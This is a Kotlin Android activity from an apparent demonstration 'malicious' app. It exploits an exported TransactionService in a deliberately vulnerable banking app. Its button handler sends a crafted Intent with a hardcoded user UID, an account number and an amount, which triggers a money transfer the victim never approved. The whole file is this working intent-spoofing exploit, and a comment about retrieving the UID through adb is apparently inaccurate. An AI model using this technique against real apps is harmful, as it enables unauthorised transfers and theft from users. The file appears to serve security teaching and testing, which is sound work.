package com.example.maliciousapplication

import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import android.view.View
import android.widget.EditText
import androidx.appcompat.app.AppCompatActivity
import com.example.maliciousapplication.R
import kotlinx.android.synthetic.main.activity_exported_service.*

class ExportedServiceActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_exported_service)
    }

    fun buttonSendMoneyOnClick(view: View) {
        val intent = Intent()
        intent.component = ComponentName("com.example.vulnerablebankingapp",
            "com.example.vulnerablebankingapp.TransactionService")
        //Get UUID from the other app using adb: adb shell am get-current-user
        intent.putExtra("userUID", "TOJBPevMX1gox9yKqsXZORs2Ftv2")
        intent.putExtra("accountNumber", text_field_account.editText?.text.toString())
        val amount = ((text_field_amount.editText?.text.toString().toFloat() * 100)).toInt()
        intent.putExtra("amount", amount.toString())
        startService(intent)
        finish()
    }
}